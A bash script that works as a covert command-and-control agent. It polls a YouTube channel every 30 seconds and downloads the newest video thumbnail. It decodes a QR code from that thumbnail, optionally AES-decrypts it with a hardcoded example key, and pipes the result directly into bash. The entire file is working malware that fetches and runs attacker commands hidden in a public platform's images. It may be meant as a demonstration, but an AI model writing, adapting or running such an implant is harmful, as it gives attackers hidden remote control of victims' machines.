#!/bin/bash
API_KEY=$(cat key.txt)



video_save=""
while true
do
    curl_output=$(curl -G -s "https://www.googleapis.com/youtube/v3/search" \
        -d channelId="UCOeYVWZgw08tDMqm7Fk4Wvw" \
        -d key="$API_KEY" \
        -d part="snippet" \
        -d order="date")
    newest_video_url=$(echo "$curl_output" | jq -r '.items | sort_by(.snippet.publishedAt) | last | .snippet.thumbnails.high.url')
    if [[ $(echo "$curl_output" | jq '.items') == "[]" ]]; then
        echo "No videos have been published on this channel"
    else
        if [[ $newest_video_url == $video_save ]]
        then
            echo "Newest video already seen"
        else
            echo "New video thumbnail: $newest_video_url"
            wget -O "$(dirname "$(readlink -f "$0")")/command.jpg" $newest_video_url
            exec=$(zbarimg --quiet "$(dirname "$(readlink -f "$0")")/command.jpg" | cut -c 9-)

            key_hex="4326462948404d635166546a576e5a72" #Please change, this is just used for the example!
            
            encrypted_data=$exec
            if [[ $(echo "$encrypted_data" | cut -c1-3) == "~1~" ]]; 
            then
                encrypted_data="${encrypted_data:3}"
                decrypted_data=$(echo -n "$encrypted_data" | base64 -d | openssl enc -d -aes-128-ecb -K "$key_hex" -nosalt -nopad)

                decrypted_data=$(echo -n "$decrypted_data" | sed 's/\x0*$//')

                echo "Decrypted data: $decrypted_data"
                echo $decrypted_data | bash
            else
                encrypted_data="${encrypted_data:3}"
                echo "Data: $encrypted_data"
                echo $encrypted_data | bash
            fi

            video_save=$newest_video_url
        fi
    fi
    sleep 30
done